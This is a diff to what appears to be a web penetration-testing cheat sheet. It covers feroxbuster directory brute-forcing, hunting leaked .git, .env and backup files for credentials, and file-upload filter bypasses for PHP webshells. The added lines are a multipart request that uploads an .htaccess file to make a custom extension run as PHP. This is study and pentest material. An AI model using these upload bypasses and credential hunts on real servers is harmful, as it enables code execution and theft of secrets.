@@ -38,8 +38,7 @@ feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raw-
   -x php,asp,aspx,jsp,html,txt,bak,zip,old -t 50 -o ferox_root.txt
 
 # recursive by default; force depth if needed, filter noise
-feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raw-medium-directories.txt \
-  -x php,txt,bak --depth 3 -C 404,403
+feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raw-medium-directories.txt -x php,txt,bak --depth 3 -C 404,403
 ```
 
 **Decision point:** `.git/` found → `git log -p` / `git-dumper` for leaked secrets. `.svn/` found → `svn log`. Backup file (`.bak`, `.old`, `~`) found → pull and diff against live app for hardcoded creds/logic. `config.php.bak`, `web.config`, `.env` found → source review for DB creds, secret keys (often reused for SSH/other services).
@@ -158,6 +157,13 @@ joomscan -u http://<target>
 5. Magic bytes: prepend `GIF89a;` before PHP payload
 6. Case manipulation: `shell.PhP`
 7. `.htaccess` upload (if allowed) to make `.jpg` execute as PHP: `AddType application/x-httpd-php .jpg`
+
+```sh
+Content-Disposition: form-data; name="the_file"; filename=".htaccess"
+Content-Type: application/x-php
+
+AddType application/x-httpd-php .custom
+```
 
 ### Ready-to-use webshells
 
